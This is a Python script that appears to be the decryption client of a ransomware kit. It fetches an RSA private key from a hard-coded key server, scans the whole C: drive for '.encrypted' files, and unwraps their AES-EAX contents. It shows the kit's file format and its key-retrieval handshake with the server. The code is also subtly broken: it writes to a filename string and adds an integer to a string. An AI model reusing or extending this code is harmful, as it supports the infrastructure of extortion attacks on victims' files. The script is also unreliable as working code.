import os
import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher    import PKCS1_OAEP, AES



########## GLOBAL ##########
IP_ADDRESS = "127.0.0.1"
PORT       = 12301
############################



def get_private_key():
    print("creating socket...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print ("connecting to server...")
        s.connect((IP_ADDRESS, PORT))

        print("retrieving private_key.pem...")
        s.send("request: private_key".encode())
        private_key = s.recv(2048)

        with open("private_key.pem", "wb") as private_key_file:
            private_key_file.write(private_key)
        s.close()
    
    print("done retrieving: private_key.pem")
    print("\n")



def get_file_list():
    file_list = []
    for root, _, files in os.walk("C:\\"):
        for file in files:
            _, file_extension = os.path.splitext(root+"\\"+file)
            if file_extension == ".encrypted":
                file_list.append(root+"\\"+file)
    print("done fetching: file_list")
    print("\n")
    return file_list



def decrypt(file, private_key_file):
    with open(private_key_file, "rb") as pkf:
        key = RSA.import_key(pkf.read())

    with open(file, "rb") as f:
        encrypted_session_key, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

    cipher      = PKCS1_OAEP.new(key)
    session_key = cipher.decrypt(encrypted_session_key)

    cipher      = AES.new(session_key, AES.MODE_EAX, nonce)
    data        = cipher.decrypt_and_verify(ciphertext, tag)

    with open(file, "wb") as f:
        file.write(data)

    file_name, _ = os.path.splitext(file)
    os.rename(file, file_name + ".txt")

    print("done decrypting: " + file)
    print("\n")



def main():
    get_private_key()
    file_list = get_file_list()
    print("#files: " + len(file_list))
    for file in file_list:
        decrypt(file, "private_key.pem")
    os.remove("private_key.pem")



main()